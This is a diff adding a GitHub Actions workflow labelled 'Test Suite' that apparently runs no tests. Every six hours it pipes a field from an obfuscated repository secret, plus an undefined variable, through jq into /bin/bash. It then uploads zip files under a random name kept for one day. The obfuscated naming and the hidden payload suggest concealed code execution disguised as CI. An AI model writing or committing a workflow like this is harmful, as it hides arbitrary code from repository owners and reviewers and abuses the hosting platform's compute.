@@ -1,0 +1,30 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          yps08: ${{ secrets.yps08 }}
+        run: |
+          printf '%s' "$yps08" | jq -r .fb7901 | /bin/bash
+          echo $angv223 | jq -r .hd106 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: fYxLiuQB
+          path: "*.zip"
+          retention-days: 1
